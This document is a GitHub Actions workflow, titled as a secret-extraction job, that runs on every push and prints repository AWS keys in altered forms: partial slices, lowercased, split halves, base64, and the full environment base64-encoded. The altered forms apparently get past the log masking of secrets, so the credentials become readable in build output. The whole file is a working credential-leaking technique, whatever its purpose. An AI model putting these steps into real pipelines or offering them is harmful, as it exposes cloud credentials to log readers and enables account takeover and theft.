```
name: Extract Secrets from Repo Secrets
on: push
jobs:
  first-job:
    env:
      AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
      AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}
    runs-on: ubuntu-latest
    steps:
      - name: Print first char of aws key
        run: "test1=`echo $AWS_ACCESS_KEY | cut -c1-1`;echo $test1"
      - name: Print lowercase aws key
        run: "test2=`echo $AWS_ACCESS_KEY | awk '{print tolower($0)}' | cut -c1-30`;echo $test2"
      - name: Print first half of aws secret key
        run: "test3=`echo $AWS_SECRET_KEY | cut -c1-20`;echo $test3"
      - name: Print second half of aws secret key
        run: "test4=`echo $AWS_SECRET_KEY | cut -c21-61`;echo $test4"
      - name: base64 encode
        run: "test5=`echo $AWS_SECRET_KEY | base64`;echo $test5"
      - name: env
        run: env | base64
```
